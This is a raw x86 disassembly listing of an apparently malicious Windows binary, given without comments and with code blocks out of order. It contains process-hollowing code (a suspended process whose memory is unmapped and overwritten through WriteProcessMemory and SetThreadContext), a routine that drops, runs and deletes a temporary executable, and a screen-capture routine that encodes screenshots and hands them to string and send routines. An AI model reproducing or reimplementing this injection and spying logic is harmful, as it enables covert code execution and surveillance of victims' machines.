push [ esi + 0x8 ]
push [ ebp + 0x8 ]
call sub_40d0dc
add esp 0xc
add [ esi + 0x8 ] ebx
jmp r-xdata
mov [ ebp + 0xc ] edi
mov ecx esi
call sub_403556
mov [ ebp + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
lea edi [ edi + edi * 2 ]
push ecx
shl edi 0x2
push ecx
sub ecx edi
push ecx
mov ecx esi
call sub_40d061
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
push eax
sub eax edi
push eax
push ebx
call sub_40d0fd
push [ ebp + 0x10 ]
lea eax [ edi + ebx ]
push eax
push ebx
call sub_40d0dc
add esp 0x18
add [ esi + 0x8 ] edi
mov ecx esi
call sub_403556
mov ebx eax
push 0x0
add ebx [ ebp + 0xc ]
mov ecx esi
push ebx
call sub_40d0b5
push eax
mov ecx esi
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
push [ esi + 0x4 ]
call sub_40d061
push [ ebp + 0x10 ]
mov ecx esi
mov [ ebp + 0xc ] eax
push edi
push eax
call sub_40d08d
mov ecx [ ebp + 0xc ]
lea eax [ edi + edi * 2 ]
lea eax [ ecx + eax * 4 ]
mov ecx esi
push eax
push [ esi + 0x8 ]
push [ ebp + 0x8 ]
call sub_40d061
push [ esi + 0x8 ]
mov ecx esi
push [ esi + 0x4 ]
call sub_4035d1
mov ecx [ esi + 0x4 ]
mov eax [ esi + 0xc ]
sub eax ecx
push 0xc
cdq
pop ecx
idiv ecx
mov ecx esi
push eax
push [ esi + 0x4 ]
call sub_403626
lea eax [ ebx + ebx * 2 ]
mov ebx [ ebp - 0x4 ]
mov ecx esi
lea eax [ ebx + eax * 4 ]
mov [ esi + 0xc ] eax
call sub_403556
add eax edi
mov [ esi + 0x4 ] ebx
lea eax [ eax + eax * 2 ]
lea eax [ ebx + eax * 4 ]
mov [ esi + 0x8 ] eax
jmp r-xdata
sub_40d061
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
mov eax [ ebp + 0x10 ]
pop edi
pop esi
pop ebp
retn 0xc
push esi
mov ecx edi
push [ ebp + 0x10 ]
call sub_40d0c8
add [ ebp + 0x10 ] 0xc
add esi 0xc
jmp r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
sub_40d08d
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
test esi esi
jbe r-xdata
pop edi
pop esi
pop ebp
retn 0xc
push [ ebp + 0x10 ]
mov ecx edi
push [ ebp + 0x8 ]
call sub_40d0c8
add [ ebp + 0x8 ] 0xc
dec esi
jne r-xdata
sub_40d0dc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
je r-xdata
pop ebp
retn
push esi
push edi
mov esi [ ebp + 0x10 ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add eax 0xc
cmp eax [ ebp + 0xc ]
movsd [ edi ] [ esi ]
jne r-xdata
pop edi
pop esi
sub_40d0fd
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x8 ] eax
je r-xdata
mov eax [ ebp + 0x10 ]
pop ebp
retn
push esi
push edi
sub [ ebp + 0x10 ] 0xc
sub eax 0xc
mov edi [ ebp + 0x10 ]
mov esi eax
movsd [ edi ] [ esi ]
cmp eax [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jne r-xdata
pop edi
pop esi
sub_40d125
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jge r-xdata
lea eax [ eax + eax * 2 ]
shl eax 0x2
push eax
call ??2@YAPAXI@Z
pop ecx
pop ebp
retn
xor eax eax
sub_40d140
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push 0xc
call sub_401c24
pop ecx
test eax eax
pop ecx
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
sub_40d18e
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx rw-data
push esi
push edi
mov ecx ebx
call sub_402109
sub esp 0x10
mov esi rw-data
mov edi esp
mov ecx ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_402168
sub esp 0x10
lea eax [ ebp + 0x8 ]
mov esi esp
push eax
push rw-data
lea eax [ ebp - 0x10 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx ebx
call sub_402198
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x1
push sub_40d3a5
mov ecx ebx
call sub_40221c
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn
sub_40d20d
push ebp
mov ebp esp
sub esp 0xfc
push esi
lea eax [ ebp + 0x8 ]
push edi
push eax
lea eax [ ebp - 0x2 ]
lea ecx [ ebp - 0x70 ]
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
push r--data
call [ getenv@IAT ]
pop ecx
push eax
lea eax [ ebp - 0x60 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x14 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x60 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x70 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x1
push 0x10
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0xfc ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::basic_ofstream<char,struct std::char_traits<char> >@IAT ]
lea ecx [ ebp - 0xfc ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::is_open@IAT ]
test al al
je r-xdata
sub esp 0x10
lea eax [ ebp - 0x1 ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
lea eax [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0xfc ]
push eax
call ??6std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@@Z
pop ecx
pop ecx
lea ecx [ ebp - 0xfc ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::close@IAT ]
xor esi esi
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x50 ] 0x3c
mov [ ebp - 0x4c ] 0x40
mov [ ebp - 0x48 ] esi
mov [ ebp - 0x44 ] esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x50 ]
push eax
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x34 ] 0x1
mov [ ebp - 0x30 ] esi
call [ ShellExecuteExA@IAT ]
test eax eax
setne [ ebp - 0x2 ]
cmp [ ebp - 0x18 ] esi
mov edi rw-data
je r-xdata
cmp [ ebp - 0x2 ] 0x1
jne r-xdata
sub esp 0x10
lea eax [ ebp - 0x1 ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx edi
call sub_402198
push 0xffffffff
push [ ebp - 0x18 ]
call [ WaitForSingleObject@IAT ]
push [ ebp - 0x18 ]
call [ CloseHandle@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ DeleteFileA@IAT ]
lea ecx [ ebp - 0xfc ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
leave
retn
sub esp 0x10
lea eax [ ebp - 0x1 ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx edi
jmp r-xdata
call sub_402198
sub_40d3a5
push ebp
mov ebp esp
sub esp 0x30
push esi
mov esi [ ebp + 0x8 ]
lea ecx [ ebp - 0x30 ]
lea eax [ esi + 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ esi + 0x28 ]
call [ SetEvent@IAT ]
push [ esi + 0x28 ]
call [ CloseHandle@IAT ]
sub esp 0x10
mov ecx esp
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ ebp - 0x30 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x10 ]
push eax
call sub_40efb5
add esp 0x24
lea ecx [ ebp - 0x10 ]
push 0x0
call sub_401289
push eax
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x20 ]
push r--data
push eax
call [ std::operator==@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x10 ]
call sub_401b3c
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor eax eax
pop esi
leave
retn 0x4
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40d20d
add esp 0x20
sub_40d477
mov eax sub_40ffc4
call _EH_prolog
sub esp 0x7c
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ ebp - 0x84 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x80 ] eax
cmp [ eax ] 0x5a4d
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
xor al al
mov esi [ eax + 0x3c ]
add esi eax
mov [ ebp - 0x14 ] esi
cmp [ esi ] 0x4550
jne r-xdata
push 0x11
pop ecx
xor eax eax
lea edi [ ebp - 0x5c ]
[ edi ]
lea edi [ ebp - 0x7c ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0x7c ]
push eax
lea eax [ ebp - 0x5c ]
push eax
push ebx
push ebx
push 0x4
pop edi
push edi
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
push ebx
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
push edi
push 0x1000
push edi
push ebx
call [ VirtualAlloc@IAT ]
mov ebx eax
mov [ ebp - 0x6c ] ebx
mov [ ebx ] 0x10007
push ebx
push [ ebp - 0x78 ]
call [ GetThreadContext@IAT ]
test eax eax
je r-xdata
push 0x0
push edi
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebx + 0xa4 ]
add eax 0x8
push eax
push [ ebp - 0x7c ]
call [ ReadProcessMemory@IAT ]
mov eax [ ebp - 0x18 ]
cmp eax [ esi + 0x34 ]
jne r-xdata
push 0x40
push 0x3000
push [ esi + 0x50 ]
push [ esi + 0x34 ]
push [ ebp - 0x7c ]
call [ VirtualAllocEx@IAT ]
mov [ ebp - 0x68 ] eax
test eax eax
je r-xdata
push eax
push [ ebp - 0x7c ]
call [ ebp - 0x84 ]
push 0x0
push [ esi + 0x54 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x7c ]
mov edi [ WriteProcessMemory@IAT ]
call edi
xor eax eax
mov [ ebp - 0x60 ] eax
push 0x0
push 0x4
lea eax [ esi + 0x34 ]
push eax
mov eax [ ebx + 0xa4 ]
add eax 0x8
push eax
push [ ebp - 0x7c ]
call edi
mov eax [ esi + 0x28 ]
add eax [ ebp - 0x68 ]
mov [ ebx + 0xb0 ] eax
push ebx
push [ ebp - 0x78 ]
call [ SetThreadContext@IAT ]
push [ ebp - 0x78 ]
call [ ResumeThread@IAT ]
cmp eax 0xffffffff
je r-xdata
lea eax [ eax + eax * 4 ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x3c ]
lea eax [ edx + eax * 8 ]
lea eax [ eax + ecx + 0xf8 ]
mov [ ebp - 0x64 ] eax
push 0x0
push [ eax + 0x10 ]
mov edx [ eax + 0x14 ]
add edx ecx
push edx
mov eax [ eax + 0xc ]
add eax [ ebp - 0x68 ]
push eax
push [ ebp - 0x7c ]
call edi
inc [ ebp - 0x60 ]
mov eax [ ebp - 0x60 ]
jmp r-xdata
mov al 0x1
jmp r-xdata
movzx ecx [ esi + 0x6 ]
cmp eax ecx
jge r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_40d71e
push ebp
mov ebp esp
sub esp 0x5c
push ebx
push esi
push edi
xor edi edi
push edi
push edi
push edi
push r--data
call [ CreateDCA@IAT ]
mov ebx eax
push ebx
mov [ ebp - 0x14 ] ebx
call [ CreateCompatibleDC@IAT ]
mov esi [ GetDeviceCaps@IAT ]
push 0x8
push ebx
mov [ ebp - 0x8 ] eax
call esi
push 0xa
push ebx
mov [ ebp - 0xc ] eax
call esi
mov esi eax
push esi
push [ ebp - 0xc ]
push ebx
call [ CreateCompatibleBitmap@IAT ]
cmp eax edi
mov [ ebp - 0x10 ] eax
jne r-xdata
push eax
push [ ebp - 0x8 ]
call [ SelectObject@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1 ]
jmp r-xdata
push 0xcc0020
push esi
push [ ebp - 0xc ]
push edi
push edi
push ebx
push esi
push [ ebp - 0xc ]
push edi
push edi
push [ ebp - 0x8 ]
call [ StretchBlt@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push eax
push edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
lea eax [ ebp - 0x5c ]
push eax
push 0x18
push [ ebp - 0x10 ]
call [ GetObjectA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0x4a ]
imul eax [ ebp - 0x4c ]
cmp ax 0x1
jne r-xdata
lea eax [ ebp - 0x1 ]
jmp r-xdata
push 0x4
pop ebx
cmp ax bx
jbe r-xdata
push 0x1
jmp r-xdata
push 0x1
mov cl bl
pop eax
shl eax cl
lea eax [ eax * 4 + 0x28 ]
push eax
jmp r-xdata
push 0x8
pop ebx
cmp ax bx
jbe r-xdata
pop ebx
push 0x40
call [ LocalAlloc@IAT ]
mov esi eax
cmp bx 0x18
mov [ esi ] 0x28
mov eax [ ebp - 0x58 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x54 ]
mov [ esi + 0x8 ] eax
mov ax [ ebp - 0x4c ]
mov [ esi + 0xc ] ax
mov ax [ ebp - 0x4a ]
mov [ esi + 0xe ] ax
jae r-xdata
push 0x10
pop ebx
cmp ax bx
jbe r-xdata
mov eax [ esi + 0x4 ]
push 0x8
add eax 0x7
pop ecx
cdq
idiv ecx
movzx ecx bx
mov [ esi + 0x10 ] edi
mov [ esi + 0x24 ] edi
imul eax ecx
imul eax [ esi + 0x8 ]
push eax
push edi
mov [ esi + 0x14 ] eax
call [ GlobalAlloc@IAT ]
mov ebx eax
cmp ebx edi
jne r-xdata
push 0x1
mov cl bl
pop eax
shl eax cl
mov [ esi + 0x20 ] eax
cmp ax 0x18
ja r-xdata
movzx eax [ esi + 0x8 ]
push edi
push esi
push ebx
push eax
push edi
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
call [ GetDIBits@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1 ]
jmp r-xdata
push 0x20
push 0x18
pop ebx
push 0x28
mov [ ebp - 0x24 ] 0x4d42
mov eax [ esi + 0x20 ]
mov ecx [ esi + 0x14 ]
lea eax [ ecx + eax * 4 ]
mov ecx [ esi ]
mov [ ebp - 0x1e ] di
mov [ ebp - 0x1c ] di
lea eax [ eax + ecx + 0xe ]
mov [ ebp - 0x22 ] eax
mov eax [ esi + 0x20 ]
mov ecx [ esi ]
lea eax [ ecx + eax * 4 + 0xe ]
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x1a ] eax
lea eax [ ebp - 0x1 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x44 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x24 ]
push 0xe
push eax
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
lea eax [ ebp - 0x34 ]
lea ecx [ ebp - 0x44 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
push 0x28
push esi
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
lea eax [ ebp - 0x34 ]
lea ecx [ ebp - 0x44 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
push [ esi + 0x14 ]
lea ecx [ ebp - 0x34 ]
push ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
lea eax [ ebp - 0x34 ]
lea ecx [ ebp - 0x44 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
push [ ebp - 0x10 ]
call [ DeleteObject@IAT ]
push ebx
call [ GlobalFree@IAT ]
push [ ebp - 0x14 ]
mov esi [ DeleteDC@IAT ]
call esi
push [ ebp - 0x8 ]
call esi
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x44 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
sub_40d999
push ebp
mov ebp esp
sub esp 0xc
push ebx
lea eax [ ebp - 0x8 ]
push esi
push eax
lea eax [ ebp - 0xc ]
xor esi esi
push eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] esi
call sub_40da32
cmp [ ebp - 0x8 ] esi
pop ecx
pop ecx
je r-xdata
or eax 0xffffffff
jmp r-xdata
push [ ebp - 0x8 ]
call [ malloc@IAT ]
mov ebx eax
pop ecx
cmp ebx esi
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
call sub_40da42
add esp 0xc
cmp [ ebp - 0xc ] esi
mov [ ebp - 0x4 ] esi
jbe r-xdata
or esi 0xffffffff
lea esi [ ebx + 0x30 ]
mov esi [ ebp - 0x4 ]
push edi
imul esi esi 0x4c
mov edi [ ebp + 0xc ]
add esi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp - 0x4 ]
pop edi
jmp r-xdata
inc [ ebp - 0x4 ]
add esi 0x4c
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0xc ]
jb r-xdata
push ebx
call [ free@IAT ]
pop ecx
mov eax esi
push [ ebp + 0x8 ]
push [ esi ]
call [ wcscmp@IAT ]
pop ecx
test eax eax
pop ecx
je r-xdata
sub_40da55
push ebp
mov ebp esp
sub esp 0x10c
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
push ebx
push ebx
push ebx
lea ecx [ ebp - 0x44 ]
call sub_40dd21
lea eax [ ebp - 0x44 ]
push ebx
push eax
push rw-data
call GdiplusStartup
lea eax [ ebp - 0x28 ]
push eax
call sub_40d71e
pop ecx
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ rw-data ]
push ebx
push eax
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x8 ] eax
call sub_40dd42
lea eax [ ebp - 0xb4 ]
push eax
push r--data
call sub_40d999
pop ecx
mov esi r--data
pop ecx
lea edi [ ebp - 0xa0 ]
push 0x1
pop eax
mov [ ebp - 0xa4 ] eax
push ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x90 ] eax
lea eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x8c ] 0x4
mov [ ebp - 0x88 ] eax
call [ rw-data ]
mov esi eax
lea eax [ ebp - 0xa4 ]
push eax
lea eax [ ebp - 0xb4 ]
push eax
push esi
lea ecx [ ebp - 0x84 ]
call sub_40de11
mov eax [ esi ]
lea ecx [ ebp - 0x10c ]
push 0x1
push ecx
push esi
call [ eax + 0x30 ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x18 ]
push eax
push ebx
push [ ebp - 0x104 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esi ]
push ebx
xor eax eax
push ebx
push ebx
push eax
push esi
call [ ecx + 0x14 ]
mov edi [ esi ]
push ebx
push [ ebp - 0x104 ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push esi
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ esi ]
push esi
call [ eax + 0x8 ]
lea eax [ ebp - 0x34 ]
push 0xa
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
call [ _itoa@IAT ]
add esp 0xc
cmp [ rw-data ] ebx
jne r-xdata
push 0xc
push r--data
call [ LoadLibraryA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
sub esp 0x10
lea eax [ ebp - 0x18 ]
mov esi esp
lea ecx [ ebp - 0x34 ]
push eax
mov eax rw-data
push eax
push ecx
push eax
lea eax [ ebp - 0x54 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x64 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x74 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x74 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x54 ]
mov ebx rw-data
mov ecx ebx
call sub_402109
sub esp 0x10
mov esi rw-data
mov edi esp
mov ecx ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_402168
push sub_40de63
mov ecx ebx
call sub_4021eb
sub esp 0x10
mov eax rw-data
mov esi esp
lea ecx [ ebp - 0x18 ]
push rw-data
push eax
push ecx
lea ecx [ ebp - 0x34 ]
push eax
push ecx
push eax
lea eax [ ebp - 0x74 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x64 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x54 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xc4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx ebx
call sub_402198
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xc4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x74 ]
jmp r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
